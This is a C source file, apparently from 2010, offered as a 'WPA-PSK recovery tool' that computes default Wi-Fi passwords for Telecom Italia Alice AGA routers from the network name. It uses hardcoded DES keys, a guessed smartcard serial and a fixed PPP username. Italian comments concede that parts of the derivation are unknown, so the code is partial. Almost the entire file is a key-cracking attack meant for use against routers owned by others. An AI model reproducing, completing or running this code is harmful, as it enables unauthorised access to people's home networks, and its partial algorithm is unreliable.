/*
 * alice-aga.c
 * 2010/09/18
 *
 * Telecom Italia Alice AGA WPA-PSK Recovery Tool
 * coded by mon@iwS, thanks to KA & tiresi@ for the partial disclosure.
 * see: http://bit.ly/bbuRDv
 *
 * usage: ./alice-aga <essid>
 *    eg: ./alice-aga Alice-51697966
 *
 * missing the smartcardSn and pppUsername generation
 * (not disclosed yet).
 *
 * uses des library, compile with -lcrypto
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <openssl/des.h>

/* macro utile per printare roba in hex */
#define printh(x) 				\
{								\
	int8_t i = 0;				\
	do {						\
		printf("%02x", x[i]);	\
		i++;					\
	} while (i < sizeof(x)); 	\
	putchar('\n');				\
} // "se tolgo questo mi si sputtana il syntax highlighting"

// macro per invertire i bytes di un blocco
#define swap(x)					\
{								\
	 int8_t i = 0;				\
	 int8_t s = sizeof(x);		\
	uint8_t y[s];				\
	memcpy(y, x, s);			\
	do {						\
		x[i] = y[(s-1)-i];		\
		i++;					\
	} while(i < s);				\
}

// macro per dividere in due parti uguali un blocco
#define split(x, a, b)			\
{								\
	int8_t s = (sizeof(x)/2);	\
	memcpy(a, x, 8);			\
	memcpy(b, x+s, s);			\
	a[s] = '\0'; b[s] = '\0';	\
}

int
main(int argc, char *argv[])
{
	if(argc != 2) exit(1);

	unsigned char  *essid = (unsigned char *)argv[1];
	unsigned char   pppUsername[] = "0!Y0URIlZfr49aZc";
	unsigned char   psk[25] = "";

	/* secondo alcune fonti, lo smartcard serial number *
	 * sarebbe formato da:                              *
	 *    B[A,E]000[0-F]HEX((HI)ESSID)F6[0-F]           *
	 * [A,E] e' casuale (si crede), ma una varianza di  *
	 * 2 e' trascurabile.                               *
	 * il primo [0-F], stando ai commenti di KA/RA      *
	 * nascosti in pillolhacking, varia basandosi sull' *
	 * ultima cifra dell'ESSID. in base a cosa? boh.    *
	 * HEX(ESSID) finisce sempre con E, a volte questo  *
	 * non accade (raro) e va paddato con 1 o 2 finche' *
	 * il valore dell'ultima cifra non diviene 'E'.     *
	 * altre volte il valore e' gia' 'E' anche se si    *
	 * necessita di padding. il padding si deriva non   *
	 * so come in base all'essid.                       *
	 * l'ultima parte (il secondo [0-F]) e' ottenuto,   *
	 * sempre stando ai commenti di KA e RA su pillol,  *
	 * effettuando sottrazioni ed addizioni su altre    *
	 * cifre dell'ESSID, posizione delle quali varia in *
	 * base ad altre cose non ben chiare. dio santo, ci *
	 * fosse qualcosa di chiaro in sto casino AGA.      */
	 
	uint32_t serial = strtoul((char *)essid+6, 0, 10);
	 uint8_t smartcardSn[8] = {
		0xB0, 0x00, 0x00,
		0x00, 0x00, 0x00,
		0xEF, 0x60
	};

	smartcardSn[0] |= 0x0A;
	smartcardSn[2] |= 0x0C;
	smartcardSn[3]  = ((serial & 0xff00000) >> 20);
	smartcardSn[4]  = ((serial & 0x00ff000) >> 12);
	smartcardSn[5]  = ((serial & 0x0000ff0) >>  4);
	smartcardSn[7] |= 0x0B;

	printf( "\n"
		" Alice AGA (partial) algorithm implementation\n"
		"     thanks to KA & tiresi@ - coded by mon@iwS\n\n"
		"     essid: %s\n"
		"    serial: %02x %02x %02x %02x %02x %02x %02x %02x\n"
		"    laires: %02x %02x %02x %02x %02x %02x %02x %02x\n"
		"    pppUsr: %s\n\n",
		 essid,
		 smartcardSn[0], smartcardSn[1], smartcardSn[2],
		 smartcardSn[3], smartcardSn[4], smartcardSn[5], smartcardSn[6],
		 smartcardSn[7],
		 smartcardSn[7],
		 smartcardSn[6], smartcardSn[5], smartcardSn[4], smartcardSn[3],
		 smartcardSn[2], smartcardSn[1], smartcardSn[0],
		 pppUsername);

	/* da qui in poi l'algoritmo e' tutto giusto e    *
	 * svolgera' correttamente la sua funzione quando *
	 * saranno note le procedure per il seriale ed il *
	 * pppUsername. info su http://bit.ly/bbuRDv      */

	unsigned char  mydes1[8],  mydes2[8],
				  crypto1[8], crypto2[8],
					 ppp1[9],    ppp2[9],
					  cryptoUsername[16];

	uint8_t key1[8] = {
		0x88, 0x92, 0xA6, 0x94,
		0xA8, 0xAA, 0xA0, 0xA2,
	};

	uint8_t key2[8] = {
		0x92, 0x8C, 0x86, 0xAC,
		0x9A, 0x94, 0x84, 0x98
	};

	DES_key_schedule ks1[8], ks2[8],
					 ks3[8], ks4[8];

	DES_cblock ret[8];

	printf( "  DES key1: "); printh(key1);
	printf( "  DES key2: "); printh(key2);


	/* calcolo myDES1 & myDES2:                      *
	 * due des_ecb a doppia chiave (key1+2 e key2+1) *
	 * sul seriale invertito della smartcard         */

	// invertiamo il seriale
	swap(smartcardSn);
	// inizializziamo il des
	DES_random_key(ret);
	// inizializziamo i keyschedule con le due chiavi
	DES_set_key((DES_cblock *)key1, ks1);
	DES_set_key((DES_cblock *)key2, ks2);
	// creiamo mydes1 e mydes2
	DES_ecb2_encrypt((DES_cblock *)smartcardSn, (DES_cblock *)mydes1, ks1, ks2, 1);
	DES_ecb2_encrypt((DES_cblock *)smartcardSn, (DES_cblock *)mydes2, ks2, ks1, 1);

	printf("    myDES1: "); printh(mydes1);
	printf("    myDES2: "); printh(mydes2);

	/* calcolo cryptoUsername:
	 * si divide il pppUsername in due blocchi da 8 bytes *
	 * poi si ripete l'operazione di des_ecb a chiave     *
	 * doppia usando mydes1 e mydes2 ottenuti poco fa     */

	// dividiamo il pppusername in modo che sia digeribile dal des
	split(pppUsername, ppp1, ppp2);
	printf("\n    pppUsr: %s + %s\n", ppp1, ppp2);
	// inizializziamo i keyschedule con mydes1 e mydes2
	DES_set_key((DES_cblock *)mydes1, ks3);
	DES_set_key((DES_cblock *)mydes2, ks4);
	// creiamo le due meta' del cryptousername
	DES_ecb2_encrypt((DES_cblock *)ppp1, (DES_cblock *)crypto1, ks3, ks4, 1);
	DES_ecb2_encrypt((DES_cblock *)ppp2, (DES_cblock *)crypto2, ks3, ks4, 1);

	printf("   crypto1: "); printh(crypto1);
	printf("   crypto2: "); printh(crypto2);

	// uniamolo in un solo blocco da 16 bytes
	memcpy(cryptoUsername, crypto1, 8);
	memcpy(cryptoUsername+8, crypto2, 8);

	printf(" cryptoUsr: "); printh(cryptoUsername);
	// e ribaltiamolo
	swap(cryptoUsername);
	printf(" rsUotpyrc: "); printh(cryptoUsername);

	/* non c'ho palle di spiegarlo a parole, *
	 * gli operatori parlano da soli.        */

	uint8_t a, q, r, c;

	for (a = 0; a < 24; a++) {
		q = ((a + 1) * 5) >> 3;
		r = ((a + 1) * 5)  % 8;
		c = cryptoUsername[q] >> (8 - r);
		if(r < 5) c |= cryptoUsername[q-1] << r;
		c &= 0x1F;
		if(c < 0xA) c += 0x30;
		else c += 0x57;
		psk[a] = c;
	}

	// apriti cielo!
	printf("\n       psk: %s\n\n", psk);

	return 0;
}
